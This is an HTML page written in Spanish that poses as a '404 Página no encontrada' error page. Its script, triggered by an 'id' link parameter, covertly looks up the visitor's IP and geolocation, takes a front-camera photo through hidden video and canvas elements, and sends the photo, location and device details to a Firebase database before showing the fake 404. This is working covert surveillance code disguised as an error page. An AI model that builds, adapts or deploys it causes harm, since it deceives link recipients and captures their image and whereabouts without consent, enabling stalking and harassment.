<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>404 - Página no encontrada</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            text-align: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
        }

        h1 {
            font-size: 6rem;
            margin-bottom: 20px;
            font-weight: 600;
        }

        p {
            font-size: 1.5rem;
            color: #666;
        }

        .loading {
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #e0e0e0;
            border-top-color: #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 4rem;
            }

            p {
                font-size: 1.2rem;
            }
        }

        #video,
        #canvas {
            display: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="loading"></div>
        <p id="status">Procesando...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script type="module">
        import { db, ref, push } from './firebase-config.js';

        const statusEl = document.getElementById('status');
        const id = new URLSearchParams(location.search).get('id');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        if (!id) {
            showError();
        } else {
            captureData();
        }

        async function captureData() {
            try {
                const geoData = await fetch('https://ipapi.co/json/').then(r => r.json());

                let photoData = null;
                try {
                    photoData = await capturePhoto();
                } catch (err) {
                    console.log('Camera not available:', err);
                }

                const expiresAt = Date.now() + (60 * 60 * 1000);

                await push(ref(db, `visitas/${id}`), {
                    ip: geoData.ip || 'Unknown',
                    ciudad: geoData.city || 'Unknown',
                    pais: geoData.country_name || 'Unknown',
                    fecha: new Date().toLocaleString('es-ES', {
                        year: 'numeric',
                        month: '2-digit',
                        day: '2-digit',
                        hour: '2-digit',
                        minute: '2-digit'
                    }),
                    timestamp: Date.now(),
                    expiresAt: expiresAt,
                    foto: photoData,
                    userAgent: navigator.userAgent,
                    idioma: navigator.language,
                    plataforma: navigator.platform
                });

                showError();
            } catch (err) {
                console.error('Error:', err);
                showError();
            }
        }

        async function capturePhoto() {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });

                    video.srcObject = stream;

                    video.onloadedmetadata = async () => {
                        await new Promise(r => setTimeout(r, 1500));

                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);

                        const imageData = canvas.toDataURL('image/jpeg', 0.5);

                        stream.getTracks().forEach(track => track.stop());

                        resolve(imageData);
                    };

                    video.onerror = () => {
                        reject(new Error('Video error'));
                    };

                } catch (err) {
                    reject(err);
                }
            });
        }

        function showError() {
            document.body.innerHTML = `
                <div class="container">
                    <h1>404</h1>
                    <p>Página no encontrada</p>
                </div>
            `;
        }
    </script>
</body>

</html>
